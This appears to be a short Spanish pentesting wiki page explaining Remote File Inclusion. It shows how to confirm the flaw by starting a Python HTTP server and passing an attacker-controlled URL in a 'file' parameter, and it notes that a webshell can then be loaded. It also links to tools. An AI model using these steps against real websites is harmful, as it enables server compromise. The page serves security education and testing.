---
cover: >-
  https://cdn.invicti.com/app/uploads/2022/06/28121817/remote-file-inclusion-vulnerability.jpg
coverY: -155
---

# Remote File Inclusion (RFI)

## ¿Qué es un RFI?

Esta vulnerabilidad es muy parecida al [Local File Inclusion (LFI)](local-file-inclusion-lfi/), solo que en este caso, en vez de ser local, es remota, por lo que se nos permite incluir archivos remotos o de otras maquinas en la maquina victima.

## Ejemplo

### Detección

Un claro ejemplo, es una web donde mediante un parámetro `filename` se visualice un archivo, pues muchas veces, estos parámetros, pueden realizar peticiones si el valor es un host externo. Pero lo primero es verificar si es vulnerable a un LFI, posteriormente, verificamos si el parámetro es vulnerable a RFI, una manera muy sencilla, es montando un servidor HTTP con Python en nuestra maquina local:

```sh
python3 -m http.server 80
```

Una vez hayamos montado el servidor, si ponemos nuestra IP en el valor de dicho parámetro, deberíamos de ver en nuestra consola, que el servidor, nos ha realizado una petición:

```http
https://myshop.com/?file=https://192.168.11.1/test.txt
```

A pesar de que en la ruta en la que hayamos montado el servidor no exista ningún archivo llamado `test.txt` el servidor hará la petición y así sabremos que es vulnerable a RFI

### Explotación

Cuando sepamos que es vulnerable, podemos cargar archivos maliciosos como una webshell en el servidor con tan solo hacernos una petición





{% hint style="info" %}
Enlaces de Interés:

1. [https://deephacking.tech/remote-file-inclusion-rfi-pentesting-web/](https://deephacking.tech/remote-file-inclusion-rfi-pentesting-web/)
2. [https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
3. [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)
{% endhint %}
